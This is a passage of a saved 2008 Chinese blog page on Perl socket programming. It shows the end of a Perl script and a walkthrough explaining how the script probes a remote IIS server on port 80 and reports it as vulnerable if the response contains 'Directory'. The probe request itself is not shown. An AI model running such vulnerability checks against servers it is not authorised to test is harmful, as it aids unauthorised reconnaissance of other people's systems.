+          &lt;17 } <br>
+          &lt;18 if ($open_or_close eq &quot;1&quot;) { <br>
+          &lt;19&nbsp; print &quot;This IIS have the bug\n&quot;; <br>
+          &lt;20 }else{ <br>
+          &lt;21&nbsp; print &quot;This IIS havn't the bug\n&quot;; <br>
+          &lt;21 } <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#21407;&#20195;&#30721;&#35299;&#=
+26512;&#65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#36825;&#37324;&#25105;&#21482;&#=
+35299;&#26512;&#20960;&#20010;&#21644;&#23454;&#29616;&#39564;&#35777;</spa=
+n><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IIS</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#26159;&#21542;&#23384;&#22312;&#28431;&#27934;&#30456;=
+&#20851;&#30340;&#31243;&#24207;&#29255;&#27573;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;11 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#36825;&#37324;&#26159;&#=
+36830;&#25509;&#36828;&#31243;&#20027;&#26426;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>80</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31471;&#21475;</span><span lang=3DEN-US style=3D'font-=
+size:
+          9.0pt;font-family:Verdana'>(</span><span style=3D'font-size:9.0pt;
+          mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#36=
+890;&#24120;&#36825;&#20010;&#31471;&#21475;&#26159;&#20998;&#37197;&#32473=
+;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>http</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#26381;&#21153;</span><span lang=3DEN-US style=3D'font-=
+size:
+          9.0pt;font-family:Verdana'>)</span><span style=3D'font-size:9.0pt;
+          mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#12=
+290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;12 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#36890;&#36807;&#19982;&#=
+36828;&#31243;&#20027;&#26426;&#24314;&#31435;&#30340;&#22871;&#25509;&#233=
+83;&#65292;&#21457;&#36865;&#19968;&#20010;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>http</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21327;&#35758;&#30340;&#21629;&#20196;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>&#8220=
+;GET&#8221;</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#32473;&#36828;&#31243;&#20027;&#26426;&#12290;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;13 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#24471;&#21040;&#36828;&#=
+31243;&#20027;&#26426;&#36820;&#22238;&#30340;&#25968;&#25454;&#12290;</spa=
+n><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;14 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#36827;&#34892;&#27979;&#=
+35797;&#65292;&#21028;&#26029;&#26102;&#20505;&#21253;&#21547;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>&#8220=
+;Directory&#8221;</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#23383;&#31526;&#65292;&#22914;&#26524;&#21253;&#21547;=
+&#65292;&#23601;&#35828;&#26126;&#36825;&#20010;&#26426;&#22120;&#26377;&#3=
+6825;&#20010;&#28431;&#27934;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;15~21 </span><span style=3D'font-size:9.0pt;mso-ascii-font-fa=
+mily:
+          Verdana;mso-hansi-font-family:Verdana'>&#31243;&#24207;&#36890;&#=
+36807;&#23545;&#21464;&#37327;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>$open_=
+or_close</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#21028;&#26029;&#65292;&#39564;&#35777;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IIS</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#26159;&#21542;&#23384;&#22312;&#28431;&#27934;&#12290;=
+&#24403;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>$open_=
+or_close</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20026;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'>&#8221;0&#8221;</span><span style=3D'font-si=
+ze:
+          9.0pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana=
+'>&#26102;&#34920;&#31034;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IIS</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#27809;&#26377;&#28431;&#27934;&#65292;&#20026;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>&#8221=
+;1&#8221;</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#26102;&#34920;&#31034;&#31243;&#24207;&#21457;&#29616;=
+</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IIS</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#23384;&#22312;&#28431;&#27934;&#12290;</span><span
+          style=3D'font-size:9.0pt;font-family:Verdana'> <span lang=3DEN-US=
+><o:p></o:p></span></span></p>
+          </div>
+          </div>
+          </div>
+          </td>
+         </tr>
+        </table>
+        </div>
+        <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;fo=
+nt-family:
+        Verdana'><o:p></o:p></span></p>
+        </td>
+       </tr>
+       <tr style=3D'mso-yfti-irow:1;mso-yfti-lastrow:yes;height:18.75pt'>
+        <td style=3D'padding:0cm 0cm 0cm 0cm;height:18.75pt'>
+        <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;fo=
+nt-family:
+        Verdana;color:#000066'>&nbsp;</span><span style=3D'font-size:9.0pt;
+        mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#=
+000066'>&#21457;&#34920;&#20110;&#65306;</span><span
+        lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana;color:#00=
+0066'>
+        2008-03-18</span><span style=3D'font-size:9.0pt;mso-ascii-font-fami=
+ly:
+        Verdana;mso-hansi-font-family:Verdana;color:#000066'>&#65292;&#2046=
+2;&#25913;&#20110;&#65306;</span><span
+        lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana;color:#00=
+0066'>
+        2008-03-18 15:59&nbsp;</span><span style=3D'font-size:9.0pt;mso-asc=
+ii-font-family:
+        Verdana;mso-hansi-font-family:Verdana;color:#000066'>&#24050;&#2798=
+3;&#35272;</span><span
+        lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana;color:#00=
+0066'>195</span><span
+        style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-fo=
+nt-family:
+        Verdana;color:#000066'>&#27425;&#65292;&#26377;&#35780;&#35770;</sp=
+an><span
+        lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana;color:#00=
+0066'>0</span><span
+        style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-fo=
+nt-family:
+        Verdana;color:#000066'>&#26465;</span><span style=3D'font-size:9.0p=
+t;
+        font-family:Verdana'> <span lang=3DEN-US><a
+        href=3D"http://blog.chinaunix.net/u2/star.php?blogid=3D59865&amp;ar=
+tid=3D499089"
+        title=3D&#25512;&#33616;&#36825;&#31687;&#25991;&#31456; id=3Dstar
+        onclick=3D"NewWindows(this.href);return false;"><span style=3D'font=
+-family:
+        SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'=
+>&#25512;&#33616;</span></a>
+        <a
+        href=3D"http://blog.chinaunix.net/u2/complaint.php?blogid=3D59865&a=
+mp;artid=3D499089"
+        title=3D&#25237;&#35785;&#36825;&#31687;&#25991;&#31456; id=3Dcompl=
+aint
+        onclick=3D"NewWindows(this.href);return false;"><span style=3D'font=
+-family:
+        SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'=
+>&#25237;&#35785;</span></a>
+        <o:p></o:p></span></span></p>
+        </td>
+       </tr>
+      </table>
+      </div>
+      <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span
+      lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p=
+></span></p>
+      </td>
+     </tr>
+    </table>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-f=
+amily:
+    Verdana'><o:p></o:p></span></p>
+    </td>
+   </tr>
+  </table>
+  </div>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  <div align=3Dcenter>
+  <table class=3DMsoNormalTable border=3D1 cellspacing=3D0 cellpadding=3D0 =
+width=3D"100%"
+   style=3D'width:100.0%;border-collapse:collapse;border:none;mso-border-al=
+t:
+   outset #BBF0FF .75pt;mso-padding-alt:0cm 0cm 0cm 0cm'>
+   <tr style=3D'mso-yfti-irow:0;height:21.0pt'>
+    <td style=3D'border:inset #BBF0FF 1.0pt;mso-border-alt:inset #BBF0FF .7=
+5pt;
+    padding:0cm 0cm 0cm 0cm;height:21.0pt'
+    background=3D"Perl&#32593;&#32476;&#32534;&#31243;%20socket%20-%20perl%=
+20-%20mouse0301.files/bg_line.gif">
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-f=
+amily:
+    Verdana'>&nbsp; </span><b><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+    Verdana;mso-hansi-font-family:Verdana'>&#32593;&#21451;&#35780;&#35770;=
+</span></b><span
+    lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p><=
+/span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:1;mso-yfti-lastrow:yes'>
+    <td style=3D'border:inset #BBF0FF 1.0pt;border-top:none;mso-border-top-=
+alt:
+    inset #BBF0FF .75pt;mso-border-alt:inset #BBF0FF .75pt;padding:0cm 0cm =
+0cm 0cm'>
+    <div align=3Dcenter>
+    <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0
+     width=3D"100%" style=3D'width:100.0%;border-collapse:collapse;mso-padd=
+ing-alt:
+     0cm 0cm 0cm 0cm'>
+     <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+      <td style=3D'padding:0cm 0cm 0cm 0cm'>
+      <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font=
+-family:
+      Verdana;color:#0066CC'><o:p>&nbsp;</o:p></span></p>
+      </td>
+     </tr>
+    </table>
+    </div>
+    <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span l=
+ang=3DEN-US
+    style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p></span></p>
+    </td>
+   </tr>
+  </table>
+  </div>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  <div align=3Dcenter>
+  <table class=3DMsoNormalTable border=3D1 cellspacing=3D0 cellpadding=3D0 =
+width=3D"100%"
+   style=3D'width:100.0%;border-collapse:collapse;border:none;mso-border-al=
+t:
+   outset #BBF0FF .75pt;mso-padding-alt:0cm 0cm 0cm 0cm'>
+   <tr style=3D'mso-yfti-irow:0;height:21.0pt'>
+    <td style=3D'border:inset #BBF0FF 1.0pt;mso-border-alt:inset #BBF0FF .7=
+5pt;
+    padding:0cm 0cm 0cm 0cm;height:21.0pt'
+    background=3D"Perl&#32593;&#32476;&#32534;&#31243;%20socket%20-%20perl%=
+20-%20mouse0301.files/bg_line.gif">
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-f=
+amily:
+    Verdana'>&nbsp; </span><b><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+    Verdana;mso-hansi-font-family:Verdana'>&#21457;&#34920;&#35780;&#35770;=
+</span></b><span
+    lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p><=
+/span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:1;height:.75pt'>
+    <td style=3D'border:inset #BBF0FF 1.0pt;border-top:none;mso-border-top-=
+alt:
+    inset #BBF0FF .75pt;mso-border-alt:inset #BBF0FF .75pt;background:white;
+    padding:0cm 0cm 0cm 0cm;height:.75pt'>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:1.0pt;mso-bi=
+di-font-size:
+    9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:2;mso-yfti-lastrow:yes'>
+    <td style=3D'border:inset #BBF0FF 1.0pt;border-top:none;mso-border-top-=
+alt:
+    inset #BBF0FF .75pt;mso-border-alt:inset #BBF0FF .75pt;background:white;
+    padding:0cm 0cm 0cm 0cm'>
+    <iframe name=3Dcomment
+     src=3D"Perl&#32593;&#32476;&#32534;&#31243;%20socket%20-%20perl%20-%20=
+mouse0301.files/comment.htm"
+     frameborder=3D0 width=3D600 height=3D160>
+    </iframe>
+    <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span l=
+ang=3DEN-US
+    style=3D'font-size:9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span><=
+/p>
+    </td>
+   </tr>
+  </table>
+  </div>
+  <p class=3DMsoNormal style=3D'margin-bottom:12.0pt'><span lang=3DEN-US
+  style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p></span></p>
+  </td>
+  <td width=3D10 style=3D'width:7.5pt;padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+  <td style=3D'padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:10.0pt;font-fa=
+mily:"Times New Roman"'><o:p>&nbsp;</o:p></span></p>
+  </td>
+  <td style=3D'padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:10.0pt;font-fa=
+mily:"Times New Roman"'><o:p>&nbsp;</o:p></span></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span lang=
+=3DEN-US
+style=3D'display:none;mso-hide:all'><o:p>&nbsp;</o:p></span></p>
+
+<div align=3Dcenter>
+
+<table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 wi=
+dth=3D950
+ style=3D'width:712.5pt;border-collapse:collapse;mso-padding-alt:0cm 0cm 0c=
+m 0cm'>
+ <tr style=3D'mso-yfti-irow:0;height:37.5pt'>
+  <td style=3D'padding:0cm 0cm 0cm 0cm;height:37.5pt'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+ </tr>
+ <tr style=3D'mso-yfti-irow:1;mso-yfti-lastrow:yes'>
+  <td style=3D'padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span lan=
+g=3DEN-US
+  style=3D'font-size:9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+  <p align=3Dcenter style=3D'text-align:center'><span lang=3DEN-US>Copyrigh=
+t &copy;
+  2001-2006 ChinaUnix.net All Rights Reserved</span></p>
+  <p align=3Dcenter style=3D'text-align:center'><span style=3D'font-family:=
+SimSun;
+  mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#24863;&#35=
+874;&#25152;&#26377;&#20851;&#24515;&#21644;&#25903;&#25345;&#36807;</span>=
+<span
+  lang=3DEN-US>ChinaUnix</span><span style=3D'font-family:SimSun;mso-ascii-=
+font-family:
+  Verdana;mso-hansi-font-family:Verdana'>&#30340;&#26379;&#21451;&#20204;</=
+span><span
+  lang=3DEN-US> <br>
+  </span><span style=3D'font-family:SimSun;mso-ascii-font-family:Verdana;
+  mso-hansi-font-family:Verdana'>&#39029;&#38754;&#29983;&#25104;&#26102;&#=
+38388;&#65306;</span><span
+  lang=3DEN-US>2.9764 </span></p>
+  <p align=3Dcenter style=3D'text-align:center'><span lang=3DEN-US><a
+  href=3D"http://www.miibeian.gov.cn/" target=3D"_blank"><span style=3D'fon=
+t-family:
+  SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#201=
+40;</span>ICP<span
+  style=3D'font-family:SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-=
+family:
+  Verdana'>&#35777;</span>041476<span style=3D'font-family:SimSun;mso-ascii=
+-font-family:
+  Verdana;mso-hansi-font-family:Verdana'>&#21495;</span></a> </span></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=3DMsoNormal><span lang=3DEN-US><o:p>&nbsp;</o:p></span></p>
+
+</div>
+
+</body>
+
+</html>
